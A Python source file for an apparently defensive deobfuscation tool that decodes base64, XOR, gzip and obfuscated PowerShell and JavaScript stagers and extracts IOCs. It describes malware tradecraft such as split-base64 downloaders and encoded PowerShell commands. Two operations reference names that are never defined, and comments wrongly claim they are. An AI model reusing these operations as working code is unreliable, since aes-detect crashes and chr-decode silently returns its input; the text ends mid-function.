"""NivXRay — 42+ decode/deobfuscate operations."""
from __future__ import annotations
import base64
import binascii
import codecs
import gzip
import zlib
import re
import html
import json
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from payload_sanitizer import sanitize_encapsulated_payload

# ==== Registry ==============================================================
OPERATIONS: Dict[str, Dict[str, Any]] = {}


def op(op_id: str, name: str, category: str, description: str = "", args: Optional[List[Dict[str, Any]]] = None):
    def deco(fn):
        OPERATIONS[op_id] = {
            "id": op_id,
            "name": name,
            "category": category,
            "description": description,
            "args": args or [],
            "fn": fn,
        }
        return fn
    return deco


def list_operations() -> List[Dict[str, Any]]:
    return [
        {k: v for k, v in o.items() if k != "fn"}
        for o in OPERATIONS.values()
    ]


def run_operation(op_id: str, data: str, args: Optional[Dict[str, Any]] = None) -> str:
    if op_id not in OPERATIONS:
        raise ValueError(f"Unknown operation: {op_id}")
    return OPERATIONS[op_id]["fn"](data, **(args or {}))


# ==== COMPRESSION ============================================================
@op("gzip-decompress", "Gzip Decompress", "Compression", "Decompress gzip data (accepts base64 or hex input).")
def _gzip_decompress(data: str) -> str:
    raw = _as_bytes(data)
    return gzip.decompress(raw).decode("utf-8", errors="replace")


@op("zlib-decompress", "Zlib Decompress", "Compression", "Decompress zlib/deflate data.")
def _zlib_decompress(data: str) -> str:
    raw = _as_bytes(data)
    try:
        return zlib.decompress(raw).decode("utf-8", errors="replace")
    except zlib.error:
        return zlib.decompress(raw, -zlib.MAX_WBITS).decode("utf-8", errors="replace")


@op("base64-gzip", "Base64 → Gzip Decompress", "Compression", "Base64 decode then gzip decompress.")
def _b64_gzip(data: str) -> str:
    raw = base64.b64decode(_clean(data), validate=False)
    return gzip.decompress(raw).decode("utf-8", errors="replace")


@op("base64-zlib", "Base64 → Zlib Decompress", "Compression", "Base64 decode then zlib decompress.")
def _b64_zlib(data: str) -> str:
    raw = base64.b64decode(_clean(data), validate=False)
    try:
        return zlib.decompress(raw).decode("utf-8", errors="replace")
    except zlib.error:
        return zlib.decompress(raw, -zlib.MAX_WBITS).decode("utf-8", errors="replace")


# ==== CRYPTOGRAPHY / ENCODING ================================================
@op("base64-decode", "Base64 Decode", "Cryptography", "Decode a Base64 string (auto-extracts payload from scripts, joins multi-line, auto-pads).")
def _b64_decode(data: str) -> str:
    # Thumb rule: ISOLATE THE PAYLOAD STRING FIRST.
    # If the input is an entire command line / script wrapper, extract the
    # enclosed base64 payload before decoding.
    isolated = sanitize_encapsulated_payload(data)
    payload = isolated if isolated is not None else data
    # Join lines & strip any remaining whitespace/newlines
    cleaned = _clean(payload)
    # Auto-pad and decode
    padded = cleaned + "=" * (-len(cleaned) % 4)
    raw = base64.b64decode(padded, validate=False)
    # If the decoded bytes are clean UTF-8, prefer that (readable output). If
    # they contain binary (compressed streams, XOR-encrypted bytes, PE headers,
    # etc.) fall back to LATIN-1 so bytes survive as 1:1 codepoints for the
    # NEXT op in the chain (gzip-decompress, xor-brute, shellcode-analyze).
    # UTF-8 with errors='replace' would substitute 0xFFFD and corrupt the
    # binary — breaking chains like base64→xor→gzip.
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return raw.decode("latin-1")


@op("base64-encode", "Base64 Encode", "Cryptography", "Encode data as Base64.")
def _b64_encode(data: str) -> str:
    return base64.b64encode(data.encode("utf-8")).decode()


@op("base32-decode", "Base32 Decode", "Cryptography", "Decode a Base32 string.")
def _b32_decode(data: str) -> str:
    return base64.b32decode(_clean(data).upper() + "=" * ((8 - len(_clean(data)) % 8) % 8)).decode("utf-8", errors="replace")


@op("hex-decode", "Hex Decode", "Cryptography", "Decode hexadecimal string to text.")
def _hex_decode(data: str) -> str:
    s = re.sub(r"[^0-9a-fA-F]", "", data)
    if len(s) % 2:
        s = s[:-1]
    return bytes.fromhex(s).decode("utf-8", errors="replace")


@op("ascii-decimal-decode", "ASCII Decimal Codes → Text", "Cryptography",
    "Decode a stream of space/comma-separated decimal ASCII codes (32-255) back into a text string. "
    "Common in obfuscated PowerShell / JS payloads and multi-layer stagers (Base32 → decimal codes → next stage). "
    "If the decimal interpretation yields mostly-non-printable output but re-interpreting the same tokens as OCTAL "
    "produces clean printable ASCII, the octal reading wins — analysts often paste `120 157 167 ...` from PowerShell "
    "obfuscators that render bytes in octal.")
def _ascii_decimal_decode(data: str) -> str:
    # Accept both space- and comma-separated tokens, and mixed whitespace
    tokens = re.findall(r"\d+", data)
    if not tokens:
        return ""
    def _decode_base(base: int) -> str:
        out = []
        for t in tokens:
            try:
                n = int(t, base)
            except ValueError:
                continue
            if 0 <= n <= 255:
                out.append(chr(n))
        return "".join(out)

    dec_out = _decode_base(10)
    # Try OCTAL fallback when the decimal reading is mostly non-printable
    # (attackers frequently paste `120 157 167 145 ...` = octal for Power…).
    try:
        # Only tokens whose digits are 0-7 can be octal
        if all(all(ch in "01234567" for ch in t) for t in tokens):
            oct_out = _decode_base(8)
            def _printable_ratio(s: str) -> float:
                if not s: return 0.0
                p = sum(1 for c in s if 32 <= ord(c) < 127 or c in "\r\n\t")
                return p / len(s)
            if _printable_ratio(oct_out) > _printable_ratio(dec_out) + 0.10:
                return oct_out
    except Exception:
        pass
    return dec_out


@op("binary-ascii-decode", "Binary ASCII (0/1) → Text", "Cryptography",
    "Decode a stream of space-separated 8-bit binary bytes back into text. "
    "Example: `01010000 01101111 01110111 ...` -> `Pow...`. Tolerates 7-bit and mixed widths.")
def _binary_ascii_decode(data: str) -> str:
    tokens = re.findall(r"[01]{7,8}", data)
    if len(tokens) < 3:
        return ""
    out = []
    for t in tokens:
        try:
            n = int(t, 2)
        except ValueError:
            continue
        if 0 <= n <= 0xFF:
            out.append(chr(n))
    return "".join(out)


@op("ps-binary-split-decode", "PowerShell Binary/Hex Split-Array → Text", "Cryptography",
    "Decode PowerShell binary-split obfuscation: `.Split('junkchars')` + `ToInt16($_, 2/10/16)`. "
    "Auto-detects delimiters from the .Split() call, chunks the data string, and converts each chunk "
    "from base-2 / base-10 / base-16 to ASCII. Handles Invoke-Obfuscation's binary/hex-array mode.")
def _ps_binary_split_decode(data: str) -> str:
    # Detect the base: 2, 10, or 16
    base_m = re.search(r"ToInt16\s*\(\s*[^,]+,\s*(2|10|16)\s*\)", data, re.IGNORECASE)
    if base_m:
        base = int(base_m.group(1))
    elif re.search(r"\[char\]\s*\[int\]\s*\(\s*['\"]?0x", data, re.IGNORECASE):
        base = 16
    else:
        return ""

    # Extract the delimiter string from .Split('...')
    delim_m = re.search(r"\.\s*Split\s*\(\s*['\"]([^'\"]{1,32})['\"]\s*\)", data, re.IGNORECASE)
    if not delim_m:
        return ""
    delims = delim_m.group(1)

    # Extract the largest data-looking single-quoted string that contains
    # digits + at least one of the delimiter characters. This is the payload.
    valid_char_class = "0-9a-fA-F" if base == 16 else "0-9"
    candidates = re.findall(r"['\"]([" + valid_char_class + re.escape(delims) + r"]{10,})['\"]", data)
    if not candidates:
        return ""
    payload = max(candidates, key=len)

    # Split by delimiter chars
    chunks = re.split("[" + re.escape(delims) + "]", payload)
    return _binary_chunks_to_text(chunks, base)


def _binary_chunks_to_text(chunks: list, base: int) -> str:
    """Convert a list of digit-string chunks (base 2/10/16) into text.

    When a base-2 chunk is longer than 8 bits, it means the obfuscator's
    delimiter set was incomplete and multiple bytes got glued together. We
    then try 7-bit AND 8-bit re-chunking and pick whichever produces more
    printable ASCII — this recovers ~all Invoke-Obfuscation binary/hex-array
    payloads that would otherwise emit garbled Unicode.
    """
    out = []
    for c in chunks:
        c = c.strip()
        if not c:
            continue
        try:
            n = int(c, base)
        except ValueError:
            continue
        # Simple case: single-byte-sized chunk
        if base != 2 or len(c) <= 8:
            if 0 <= n <= 0x10FFFF:
                out.append(chr(n))
            continue
        # Over-long binary chunk → try 7 and 8-bit re-splits, pick best
        best_text = ""
        best_score = -1
        # Both group sizes × both alignments (L-to-R and R-to-L). When the
        # chunk length isn't a clean multiple of group_size, the correct
        # boundary depends on how the obfuscator wrote it — R-to-L is common
        # because the LOW-value byte often has a leading zero the obfuscator
        # keeps in the string.
        for group_size in (7, 8):
            for offset in (0, len(c) % group_size):
                if offset == group_size:
                    continue
                sub = []
                i = offset
                # If offset > 0, decode the leading fragment as its own char too
                if offset > 0:
                    try:
                        nn = int(c[:offset], 2)
                        if 32 <= nn <= 127:
                            sub.append(chr(nn))
                    except ValueError:
                        pass
                valid = True
                while i < len(c):
                    grp = c[i:i + group_size]
                    if len(grp) < group_size:
                        try:
                            nn = int(grp, 2)
                            if 32 <= nn <= 127:
                                sub.append(chr(nn))
                        except ValueError:
                            valid = False
                        break
                    try:
                        nn = int(grp, 2)
                    except ValueError:
                        valid = False
                        break
                    if not (0 <= nn <= 0x10FFFF):
                        valid = False
                        break
                    sub.append(chr(nn))
                    i += group_size
                if not valid:
                    continue
                text = "".join(sub)
                # Score: printable-ASCII count + letter/space bonus (favors real
                # words over ASCII-noise like `l2` vs `ld`). Slight 8-bit bonus
                # since ASCII encoders default to 8-bit even for 7-bit values.
                printable = sum(1 for ch in text if 32 <= ord(ch) < 127)
                letters = sum(1 for ch in text if ch.isalpha() or ch in " \r\n\t")
                score = printable + letters + (0.1 if group_size == 8 else 0.0)
                if score > best_score or (score == best_score and len(text) < len(best_text)):
                    best_score = score
                    best_text = text
        # If both 7- and 8-bit re-splits failed, fall back to single-code-point
        if best_text:
            out.append(best_text)
        elif 0 <= n <= 0x10FFFF:
            out.append(chr(n))
    return "".join(out)


@op("hex-encode", "Hex Encode", "Cryptography", "Encode text as hexadecimal.")
def _hex_encode(data: str) -> str:
    return data.encode("utf-8").hex()


@op("rot13", "ROT13", "Cryptography", "Caesar cipher with shift 13.")
def _rot13(data: str) -> str:
    return codecs.decode(data, "rot_13")


@op("rot47", "ROT47", "Cryptography", "ROT47 substitution across printable ASCII.")
def _rot47(data: str) -> str:
    out = []
    for ch in data:
        c = ord(ch)
        if 33 <= c <= 126:
            out.append(chr(33 + (c - 33 + 47) % 94))
        else:
            out.append(ch)
    return "".join(out)


@op("xor", "XOR (single-byte key)", "Cryptography", "XOR the input against a single-byte key.", [{"name": "key", "type": "string", "default": "0x2A", "description": "Hex (0x2A) or decimal (42) or ASCII char"}])
def _xor(data: str, key: str = "0x2A") -> str:
    k = _parse_byte(key)
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("utf-8", errors="replace")
    return bytes(b ^ k for b in raw).decode("utf-8", errors="replace")


@op("xor-bruteforce", "XOR Bruteforce (single-byte)", "Cryptography", "Try all 256 single-byte XOR keys and return best candidates.")
def _xor_bf(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("utf-8", errors="replace")
    scored: List[Tuple[int, int, str]] = []
    for k in range(256):
        try:
            dec = bytes(b ^ k for b in raw).decode("utf-8", errors="replace")
            score = sum(1 for c in dec if 32 <= ord(c) < 127 or c in "\n\r\t")
            scored.append((score, k, dec))
        except Exception:
            continue
    scored.sort(reverse=True)
    top = scored[:5]
    return "\n".join(f"[key=0x{k:02X}] {t[:200]}" for _, k, t in top)


@op("url-decode", "URL Decode", "Cryptography", "Percent-decode a URL-encoded string.")
def _url_decode(data: str) -> str:
    return urllib.parse.unquote_plus(data)


@op("url-encode", "URL Encode", "Cryptography", "Percent-encode a string.")
def _url_encode(data: str) -> str:
    return urllib.parse.quote_plus(data)


@op("html-decode", "HTML Entity Decode", "Cryptography", "Decode HTML entities like &amp; &lt; &#x41;")
def _html_decode(data: str) -> str:
    return html.unescape(data)


@op("html-encode", "HTML Entity Encode", "Cryptography", "Encode special characters as HTML entities.")
def _html_encode(data: str) -> str:
    return html.escape(data)


@op("unicode-escape", "Unicode Escape Decode", "Cryptography", "Decode \\uXXXX Unicode escapes.")
def _unicode_esc(data: str) -> str:
    return codecs.decode(data.encode("utf-8"), "unicode_escape")


@op("octal-ascii-decode", "Octal ASCII Decode", "Cryptography",
    "Decode backslash-octal streams like \\110\\145\\154\\154\\157 -> Hello.")
def _octal_ascii(data: str) -> str:
    # Match 2- or 3-digit octal groups (0-377). Reject sequences whose value
    # would be > 0xFF (non-ASCII escape range).
    def _sub(m):
        v = int(m.group(1), 8)
        return chr(v) if 0 <= v <= 0xFF else m.group(0)
    return re.sub(r"\\([0-7]{2,3})", _sub, data)


@op("utf16le-decode", "UTF-16LE Decode", "Cryptography", "Decode bytes as UTF-16 Little Endian.")
def _utf16le(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("utf-8", errors="replace")
    return raw.decode("utf-16-le", errors="replace")


@op("reverse", "Reverse String", "Cryptography", "Reverse the input string.")
def _reverse(data: str) -> str:
    return data[::-1]


# ==== DEOBFUSCATION ==========================================================
@op("cmd-deobfuscate", "CMD Deobfuscate", "Deobfuscation", "Strip CMD.exe obfuscation: caret escapes, quoted concat, %ENV% noise.")
def _cmd_deob(data: str) -> str:
    s = data
    # Remove caret escapes: c^m^d -> cmd
    s = re.sub(r"\^", "", s)
    # Collapse quoted-string concatenation like c"m"d
    s = re.sub(r'"', "", s)
    # Remove FOR /F variable extraction noise (best effort)
    s = re.sub(r"%[A-Za-z0-9_]{1,32}:~[\d,\-]+%", "", s)
    return s


@op("powershell-deobfuscate", "PowerShell Deobfuscate", "Deobfuscation", "Undo common PowerShell obfuscation: tick, format-string, string join.")
def _ps_deob(data: str) -> str:
    s = data
    # Remove backticks
    s = s.replace("`", "")
    # Handle -join operator on char arrays: [char[]](97,98,99) -> abc
    def _join_chars(m):
        try:
            nums = [int(x.strip()) for x in m.group(1).split(",") if x.strip()]
            return '"' + "".join(chr(n) for n in nums) + '"'
        except Exception:
            return m.group(0)
    s = re.sub(r"\[char\[\]\]\s*\(([^\)]+)\)", _join_chars, s, flags=re.IGNORECASE)
    # Handle [char]NN
    s = re.sub(r"\[char\]\s*(\d{1,4})", lambda m: chr(int(m.group(1))), s, flags=re.IGNORECASE)
    # Remove common env noise ${env:comspec}
    s = re.sub(r"\$\{?env:[A-Za-z0-9_]+\}?", "", s, flags=re.IGNORECASE)
    return s


@op("powershell-encoded", "PowerShell -EncodedCommand", "Deobfuscation", "Decode -EncodedCommand base64+UTF-16LE payload (auto-extracts from full PowerShell command lines).")
def _ps_encoded(data: str) -> str:
    # Thumb rule: ISOLATE THE PAYLOAD STRING FIRST.
    isolated = sanitize_encapsulated_payload(data)
    if isolated:
        payload = re.sub(r"[^A-Za-z0-9+/=]", "", isolated)
        raw = base64.b64decode(payload + "=" * (-len(payload) % 4), validate=False)
        return raw.decode("utf-16-le", errors="ignore")

    # Fallback — regex-based extraction from the -e flag when sanitizer returns None
    joined = " ".join(data.splitlines())
    m = re.search(
        r"(?:-e(?:c|nc|ncoded(?:command)?)?)\s+([A-Za-z0-9+/=\s]+)",
        joined,
        re.IGNORECASE,
    )
    payload = m.group(1) if m else joined
    payload = re.sub(r"[^A-Za-z0-9+/=]", "", payload)
    raw = base64.b64decode(payload + "=" * (-len(payload) % 4), validate=False)
    return raw.decode("utf-16-le", errors="ignore")


@op("js-charcode", "JavaScript CharCode Decode", "Deobfuscation", "Decode String.fromCharCode(a,b,c) sequences.")
def _js_charcode(data: str) -> str:
    def _decode(m):
        try:
            nums = [int(x.strip()) for x in m.group(1).split(",") if x.strip()]
            return "".join(chr(n) for n in nums)
        except Exception:
            return m.group(0)
    return re.sub(r"String\.fromCharCode\s*\(([\d,\s]+)\)", _decode, data)


@op("js-unescape", "JavaScript Unescape (\\xNN)", "Deobfuscation", "Decode \\xNN hex escapes commonly used in JS obfuscation.")
def _js_unescape(data: str) -> str:
    return re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), data)


@op("defang-iocs", "Defang IOCs", "Deobfuscation", "Defang URLs/IPs/emails (http→hxxp, .→[.], @→[@]).")
def _defang(data: str) -> str:
    s = re.sub(r"(?i)http", "hxxp", data)
    s = re.sub(r"(?i)https", "hxxps", s)
    s = s.replace(".", "[.]").replace("@", "[@]")
    return s


@op("refang-iocs", "Refang IOCs", "Deobfuscation", "Undo defanging: hxxp→http, [.]→., [@]→@.")
def _refang(data: str) -> str:
    s = data
    s = re.sub(r"(?i)hxxps", "https", s)
    s = re.sub(r"(?i)hxxp", "http", s)
    s = s.replace("[.]", ".").replace("(.)", ".").replace("{.}", ".")
    s = s.replace("[@]", "@").replace("(@)", "@").replace("[at]", "@")
    s = s.replace("[://]", "://")
    return s


@op("strip-null-bytes", "Strip Null Bytes", "Deobfuscation", "Remove null bytes (0x00) from the input.")
def _strip_null(data: str) -> str:
    return data.replace("\x00", "")


@op("strip-non-printable", "Strip Non-Printable", "Deobfuscation", "Remove non-printable ASCII characters.")
def _strip_np(data: str) -> str:
    return "".join(c for c in data if c.isprintable() or c in "\n\r\t")


@op("extract-strings", "Extract Strings (≥4)", "Deobfuscation", "Extract printable strings of length ≥4 (like GNU strings).")
def _strings(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("utf-8", errors="replace")
    out = []
    cur = []
    for b in raw:
        if 32 <= b < 127:
            cur.append(chr(b))
        else:
            if len(cur) >= 4:
                out.append("".join(cur))
            cur = []
    if len(cur) >= 4:
        out.append("".join(cur))
    return "\n".join(out)


# ==== PARSING / EXTRACTION ===================================================
@op("extract-urls", "Extract URLs", "Extractors", "Extract URLs (refanged) from any text.")
def _ext_urls(data: str) -> str:
    refanged = _refang(data)
    urls = re.findall(r"https?://[^\s\"'<>\)]+", refanged, re.IGNORECASE)
    return "\n".join(dict.fromkeys(urls))


@op("extract-ips", "Extract IPs", "Extractors", "Extract IPv4 addresses.")
def _ext_ips(data: str) -> str:
    ips = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", _refang(data))
    return "\n".join(dict.fromkeys(ips))


@op("extract-emails", "Extract Emails", "Extractors", "Extract email addresses.")
def _ext_emails(data: str) -> str:
    emails = re.findall(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}", _refang(data))
    return "\n".join(dict.fromkeys(emails))


@op("extract-domains", "Extract Domains", "Extractors", "Extract domain names.")
def _ext_domains(data: str) -> str:
    doms = re.findall(r"\b(?:[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b", _refang(data).lower())
    return "\n".join(dict.fromkeys(doms))


@op("extract-hashes", "Extract Hashes", "Extractors", "Extract MD5/SHA1/SHA256 hashes.")
def _ext_hashes(data: str) -> str:
    md5 = re.findall(r"\b[a-fA-F0-9]{32}\b", data)
    sha1 = re.findall(r"\b[a-fA-F0-9]{40}\b", data)
    sha256 = re.findall(r"\b[a-fA-F0-9]{64}\b", data)
    lines = [f"MD5:    {h}" for h in md5] + [f"SHA1:   {h}" for h in sha1] + [f"SHA256: {h}" for h in sha256]
    return "\n".join(lines)


@op("extract-base64", "Extract Base64 Blocks", "Extractors", "Extract long Base64-looking blocks (≥24 chars).")
def _ext_b64(data: str) -> str:
    blocks = re.findall(r"[A-Za-z0-9+/]{24,}={0,2}", data)
    return "\n".join(dict.fromkeys(blocks))


# ==== FORMATTING =============================================================
@op("json-beautify", "JSON Beautify", "Formatting", "Pretty-print a JSON string.")
def _json_pretty(data: str) -> str:
    return json.dumps(json.loads(data), indent=2)


@op("json-minify", "JSON Minify", "Formatting", "Minify a JSON string.")
def _json_min(data: str) -> str:
    return json.dumps(json.loads(data), separators=(",", ":"))


@op("uppercase", "Uppercase", "Formatting", "Convert text to UPPERCASE.")
def _upper(data: str) -> str:
    return data.upper()


@op("lowercase", "Lowercase", "Formatting", "Convert text to lowercase.")
def _lower(data: str) -> str:
    return data.lower()


@op("trim-whitespace", "Trim Whitespace", "Formatting", "Strip whitespace from each line.")
def _trim(data: str) -> str:
    return "\n".join(line.strip() for line in data.splitlines())


@op("dedupe-lines", "Deduplicate Lines", "Formatting", "Remove duplicate lines (preserves order).")
def _dedup(data: str) -> str:
    return "\n".join(dict.fromkeys(data.splitlines()))


# ==== HASHING (info) =========================================================
@op("md5", "MD5", "Hashing", "MD5 hash of input.")
def _md5(data: str) -> str:
    import hashlib; return hashlib.md5(data.encode("utf-8")).hexdigest()


@op("sha1", "SHA-1", "Hashing", "SHA-1 hash of input.")
def _sha1(data: str) -> str:
    import hashlib; return hashlib.sha1(data.encode("utf-8")).hexdigest()


@op("sha256", "SHA-256", "Hashing", "SHA-256 hash of input.")
def _sha256(data: str) -> str:
    import hashlib; return hashlib.sha256(data.encode("utf-8")).hexdigest()


# ─── Feb 2026 · P2 · Base85 + Rolling XOR + AES detector ─────────────────

@op("base85-decode", "Base85 / Ascii85 Decode", "Cryptography",
    "Decode Base85 (Ascii85) blob (with or without `<~ ~>` delimiters).")
def _base85_decode(data: str) -> str:
    import base64 as _b
    stripped = data.strip()
    if stripped.startswith("<~") and stripped.endswith("~>"):
        stripped = stripped[2:-2]
    stripped = re.sub(r"\s+", "", stripped)
    try:
        raw = _b.a85decode(stripped, adobe=False)
        return raw.decode("utf-8", errors="replace")
    except Exception:
        try:
            raw = _b.b85decode(stripped)
            return raw.decode("utf-8", errors="replace")
        except Exception as e:
            return f"# base85 decode error: {e}"


@op("xor-rolling", "XOR Rolling Multi-Byte", "Cryptography",
    "Brute-force XOR against every 2-6 byte key. Returns the decode with the "
    "highest English/PE/base64 printability score.",
    [{"name": "max_key_len", "type": "string", "default": "6",
      "description": "Maximum key length to brute-force"}])
def _xor_rolling(data: str, max_key_len: str = "6") -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("latin-1", errors="replace")
    try:
        max_len = min(int(max_key_len), 8)
    except Exception:
        max_len = 6
    best_score, best_output, best_key = 0.0, "", b""
    import itertools as _it
    # Try short keys — brute-force by byte histogram fitting
    for kl in range(1, max_len + 1):
        # For each position mod kl, find the byte value that gives max printability
        key = bytearray(kl)
        for pos in range(kl):
            best_b, best_pr = 0, 0
            for b in range(256):
                pr = sum(1 for i in range(pos, min(len(raw), pos + 256 * kl), kl)
                         if 32 <= (raw[i] ^ b) < 127 or (raw[i] ^ b) in (9, 10, 13))
                if pr > best_pr:
                    best_pr, best_b = pr, b
            key[pos] = best_b
        # Score the full decode
        decoded = bytes(r ^ key[i % kl] for i, r in enumerate(raw))
        pr = sum(1 for b in decoded if 32 <= b < 127 or b in (9, 10, 13)) / max(len(decoded), 1)
        if pr > best_score:
            best_score = pr
            best_key = bytes(key)
            best_output = decoded.decode("latin-1", errors="replace")
    return f"[key={best_key.hex()}, score={best_score:.0%}]\n{best_output}"


@op("aes-detect", "AES Ciphertext Detector", "Cryptography",
    "Detect AES-CBC/GCM ciphertext markers (IV+block structure) and surface "
    "candidate key/IV extraction — does NOT decrypt without a known key.")
def _aes_detect(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("latin-1", errors="replace")
    if len(raw) < 32:
        return "# AES detector: input too short (need ≥32 bytes for IV+block)"
    if len(raw) % 16 != 0:
        return f"# AES detector: length {len(raw)} not multiple of 16 (AES block size)"
    import math
    freq = Counter(raw[:1024])  # noqa: F821 — Counter imported in operations
    entropy = -sum((c/len(raw[:1024])) * math.log2(c/len(raw[:1024])) for c in freq.values() if c > 0)
    verdict = "LIKELY_AES" if entropy > 7.0 else "UNLIKELY_AES"
    return (f"# AES Ciphertext Analysis\n"
            f"# Length: {len(raw)} bytes ({len(raw)//16} blocks of 16)\n"
            f"# Entropy: {entropy:.2f} bits/byte\n"
            f"# Verdict: {verdict}\n"
            f"# Candidate IV (first 16 bytes hex): {raw[:16].hex()}\n"
            f"# Ciphertext blocks (hex, next 32 bytes): {raw[16:48].hex()}\n"
            f"# — Provide key via `aes-decrypt` op to decrypt.")


@op("magic-integer-array", "Magic Integer Array Decoder", "Deobfuscation",
    "Auto-decodes @(N,N,N,...) integer arrays and [char[]] variants that "
    "encode ASCII text.")
def _magic_integer_array(data: str) -> str:
    m = re.search(r"[@\(\[\{]\s*((?:\d{1,4}\s*,\s*){3,}\d{1,4})\s*[\)\]\}]", data)
    if not m:
        return data
    try:
        nums = [int(x.strip()) for x in m.group(1).split(",") if x.strip()]
        if all(0 <= n <= 127 for n in nums):
            return "".join(chr(n) for n in nums)
        return data
    except Exception:
        return data


@op("snappy-decompress", "Snappy Decompress", "Compression",
    "Decompress Snappy-compressed data (raw or framed).")
def _snappy_decompress(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("latin-1", errors="replace")
    try:
        import snappy  # optional dependency
        return snappy.decompress(raw).decode("utf-8", errors="replace")
    except ImportError:
        return "# snappy decode error: python-snappy not installed"
    except Exception as e:
        return f"# snappy decode error: {e}"


@op("mach-o-detect", "Mach-O Header Detector", "Extractors",
    "Detect Mach-O (macOS binary) headers by magic bytes.")
def _mach_o_detect(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("latin-1", errors="replace")
    if len(raw) < 4:
        return "# Mach-O: too short"
    magic = raw[:4]
    verdict = None
    if magic == b"\xca\xfe\xba\xbe": verdict = "Mach-O Fat/Universal"
    elif magic == b"\xfe\xed\xfa\xce": verdict = "Mach-O 32-bit (big-endian)"
    elif magic == b"\xfe\xed\xfa\xcf": verdict = "Mach-O 64-bit (big-endian)"
    elif magic == b"\xce\xfa\xed\xfe": verdict = "Mach-O 32-bit (little-endian)"
    elif magic == b"\xcf\xfa\xed\xfe": verdict = "Mach-O 64-bit (little-endian)"
    if verdict:
        return f"# Mach-O detected: {verdict}\n# Magic: {magic.hex()}\n{raw[:64].hex()}..."
    return f"# No Mach-O magic found (first 4 bytes: {magic.hex()})"




# ==== ARCHETYPE CHAIN ALIASES ================================================
# These ops make the semantic IDs emitted inside `wrapper_archetypes.py` chains
# runnable via the Recipe UI. They fall into 3 buckets:
#   1. Real aliases that forward to an existing op (e.g. xor-byte -> xor)
#   2. New concrete ops that do a genuine transform (utf16le-or-utf8-decode,
#      extract-b64, extract-hex, strip-carets, strip-ticks, ...)
#   3. Semantic annotators that pass data through unchanged plus a marker
#      (dev-tcp-annotate, clipboard-cradle-annotate, native-cmd-explain, ...)
#      — these exist so a Recipe step doesn't error with "Unknown operation".

# --- Bucket 1: aliases to existing decoders --- #
@op("xor-byte", "XOR (single-byte, alias)", "Cryptography",
    "Alias of `xor` — single-byte XOR against a key.",
    [{"name": "key", "type": "string", "default": "0x2A", "description": "Hex/decimal/char"}])
def _xor_byte_alias(data: str, key: str = "0x2A") -> str:
    return _xor(data, key)


@op("reverse-string", "Reverse String (alias)", "Cryptography", "Alias of `reverse`.")
def _reverse_alias(data: str) -> str:
    return data[::-1]


@op("js-charcode-decode", "JS CharCode (alias)", "Deobfuscation", "Alias of `js-charcode`.")
def _js_charcode_alias(data: str) -> str:
    return _js_charcode(data)


@op("ascii-decode", "ASCII Decode", "Cryptography",
    "Decode bytes as printable ASCII (handles hex/base64 input transparently).")
def _ascii_decode(data: str) -> str:
    raw = _as_bytes(data) if _is_hexlike(data) else data.encode("utf-8", errors="replace")
    return raw.decode("ascii", errors="replace")


@op("chr-decode", "Chr()/Character Decode", "Cryptography",
    "Decode comma/space-separated character codes to text (Chr(NN), [char]NN).")
def _chr_decode(data: str) -> str:
    # Reuse ASCII decimal path first; fallback to hex if hex-shaped.
    try:
        return _ascii_decimal(data)  # noqa: F821 — defined earlier in module
    except Exception:
        return data


@op("chr-map", "Chr()/Character Map (alias)", "Cryptography", "Alias of `chr-decode`.")
def _chr_map_alias(data: str) -> str:
    return _chr_decode(data)


@op("hex-decode-alt", "Hex Decode (bytes)", "Cryptography", "Alias of `hex-decode`.")
def _hex_decode_alt(data: str) -> str:
    return _hex_decode(data)  # noqa: F821


# --- Bucket 2: new concrete decoders --- #
@op("extract-b64", "Extract Base64 (first block)", "Extractors",
    "Extract the first/longest base64-looking blob from wrapper text.")
def _extract_b64(data: str) -> str:
    blocks = re.findall(r"[A-Za-z0-9+/]{24,}={0,2}", data)
    if not blocks:
        return data
    # Return the longest block (most likely the payload)
    return max(blocks, key=len)


@op("extract-b64-pair", "Extract Base64 Pair", "Extractors",
    "Extract 2 concatenated base64 blocks (e.g. split payload variants) and join them.")
def _extract_b64_pair(data: str) -> str:
    blocks = re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", data)
    if len(blocks) < 2:
        return blocks[0] if blocks else data
    blocks.sort(key=len, reverse=True)
    return blocks[0] + blocks[1]


@op("extract-b64-concat", "Extract Concatenated Base64 (`'a'+'b'+…`)", "Extractors",
    "Reconstructs split base64 payloads stored as `'chunk1'+'chunk2'+…'chunkN'` "
    "(Emotet / IcedID / Cobalt Strike downloader tradecraft). Concatenates every "
    "quoted string fragment along a `+`-chain — even when individual chunks are "
    "short — and returns the joined blob. Length-selected: only fires when the "
    "concat produces a substantially longer blob than any single quoted chunk.")
def _extract_b64_concat(data: str) -> str:
    # 1. Find every quoted-string `+` chain of length ≥ 3 chunks (single or double quotes).
    #    Chain shape: 'x'+'y'+…+'z' or "x"+"y"+…+"z"  — chunks are base64-shape.
    #    We match TWO quote styles independently.
    best = ""
    for qc in ("'", '"'):
        pat = qc + r"([A-Za-z0-9+/=]{4,120})" + qc
        # Grab a run of ≥3 chunks separated by `+` (allowing whitespace)
        chain_pat = r"(?:" + pat + r"\s*\+\s*){2,}" + pat
        for m in re.finditer(chain_pat, data):
            joined = "".join(re.findall(pat, m.group(0)))
            if len(joined) > len(best):
                best = joined
    # 2. Fallback: also try concatenating ALL individual quoted b64-shape chunks
    #    (some samples separate chunks by variable references, not just `+`).
    all_chunks_single = re.findall(r"'([A-Za-z0-9+/=]{20,120})'", data)
    all_chunks_double = re.findall(r'"([A-Za-z0-9+/=]{20,120})"', data)
    for chunks in (all_chunks_single, all_chunks_double):
        if len(chunks) >= 5:  # 5+ same-quote-style chunks — very likely a payload
            joined = "".join(chunks)
